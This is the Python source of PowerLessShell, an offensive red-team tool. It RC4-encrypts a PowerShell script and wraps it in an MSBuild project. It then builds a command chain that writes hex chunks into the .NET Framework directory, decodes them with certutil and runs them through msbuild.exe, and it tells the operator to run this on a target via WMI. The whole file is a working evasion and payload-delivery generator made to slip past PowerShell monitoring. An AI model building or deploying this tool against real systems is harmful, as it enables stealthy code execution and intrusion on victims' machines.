# Author: Mr.Un1k0d3r - RingZer0 Team 2017

import random
import string
import base64
import sys
import re
import os

TEMPLATE = "include/template.csproj"
IS_CMD_ARGS = False

class Generator:

	def __init__(self, path):
		self.error = 0
		self.banner()
		self.data = self.load_file(path, True)
		self.rand_vars()
		self.chunk_size = 1024		
	def clearscreen(self):
		os.system("clear")	

	def print_error(self, error):
		print "\033[91m[-] >>> %s\033[00m" % error
		
	def banner(self):
		self.clearscreen()
		print "\n\n\033[33mPowerLessShell - Remain Stealth"
		print "         More PowerShell Less Powershell.exe - Mr.Un1k0d3r RingZer0 Team\033[00m"
		print "            ___"
		print "        .-\"; ! ;\"-."
		print "      .'!  : | :  !`."
		print "     /\  ! : ! : !  /\\"
		print "    /\ |  ! :|: !  | /\\"
		print "   (  \ \ ; :!: ; / /  )"
		print "  ( `. \ | !:|:! | / .' )"
		print "  (`. \ \ \!:|:!/ / / .')"
		print "   \ `.`.\ |!|! |/,'.' /"
		print "    `._`.\\\!!!// .'_.'"
		print "       `.`.\\|//.'.'"
		print "        |`._`n'_.'|"
		print "        `----^----\"\n\n"
			
	def gen_str(self, size):
		return "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size)) 

	def rand_vars(self):
		for i in reversed(range(1, 31)):
			self.data = self.data.replace("VAR" + str(i), self.gen_str(random.randrange(5, 25)))
			
	def get_output(self):
		return self.data
		
	def gen_rc4_key(self, size):
		return os.urandom(size)
		
	def format_rc4_key(self, key):
		return "0x" + ", 0x".join(re.findall("..", key.encode("hex")))
		
	def capture_input(self, mod = "", index = 0):
		if IS_CMD_ARGS:
			return sys.argv[index]
		if not mod == "":
			mod = "(%s)" % mod
		return raw_input("\n%s>>> " % mod).strip()
		
	def load_file(self, path, fatal_error = False):
		data = ""
		try:
			data = open(path, "rb").read()
		except:
			self.error = 1
			self.print_error("%s file not found." % path)
			if fatal_error:
				exit(0)
		return data
		
	def get_error(self):
		if IS_CMD_ARGS:
			exit(0)

		current = self.error
		self.error = 0
		return current
		

	def gen_final_cmd(self, path):
		payload = ""
		size = 0

		filepath = []
		filepath.append(self.gen_str(random.randrange(5, 25)))
		filepath.append(self.gen_str(random.randrange(5, 25)))

		data = self.load_file(path).encode("hex")
		for chunk in re.findall("." * self.chunk_size, data):
		        payload += "echo %s >> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\%s && " % (chunk, filepath[0])
		        size += self.chunk_size

		if len(data) > size:
			payload += "echo %s >> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\%s" % (data[(len(data) - size) * -1:], filepath[0])

		payload += " && certutil -decodehex C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\%s C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\%s && cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ && msbuild.exe %s" % (filepath[0], filepath[1], filepath[1])
		return payload

class RC4:

	def KSA(self, key):
		keylength = len(key)

		S = range(256)

		j = 0
		for i in range(256):
			j = (j + S[i] + key[i % keylength]) % 256
			S[i], S[j] = S[j], S[i]

		return S


	def PRGA(self, S):
		i = 0
		j = 0
		while True:
			i = (i + 1) % 256
			j = (j + S[i]) % 256
			S[i], S[j] = S[j], S[i] 

			K = S[(S[i] + S[j]) % 256]
			yield K


	def Encrypt(self, plaintext, key):
		output = ""
		key = [ord(c) for c in key]
		S = self.KSA(key)
		keystream = self.PRGA(S)
		for c in plaintext:
			output = output + chr(ord(c) ^ keystream.next())
		return output	
		
if __name__ == "__main__":
	
	if len(sys.argv) == 3:
		IS_CMD_ARGS = True

	try:
		gen = Generator(TEMPLATE)
		rc4 = RC4()
		key = gen.gen_rc4_key(32)

		powershell = gen.capture_input("Path to the PowerShell script", 1)
		powershell = gen.load_file(powershell, False)	
		while gen.get_error():
			powershell = gen.capture_input("Path to the PowerShell script", 1)
			powershell = gen.load_file(powershell, False)
		
		outfile = gen.capture_input("Path for the generated MsBuild out file", 2)
		cipher = base64.b64encode(rc4.Encrypt(powershell, key))
		output = gen.get_output()
		output = output.replace("[KEY]", gen.format_rc4_key(key)).replace("[PAYLOAD]", cipher)
		try:
			open(outfile, "wb").write(output)
		except:
			gen.print_error("Failed to write the output to %s" % outfile)

		outcmd = gen.gen_final_cmd(outfile)
		try:
			open(outfile + ".cmd", "wb").write(outcmd)
		except:
			gen.print_error("Failed to write the output to %s.cmd" % outfile)

		print "\n\n[+] %s was generated.\n[+] %s.cmd was generated.\n[+] Run the command inside of %s.cmd on the target system using WMI." % (outfile, outfile, outfile)			
	except KeyboardInterrupt:
			print ""
			gen.print_error("Exiting")
			exit(0)
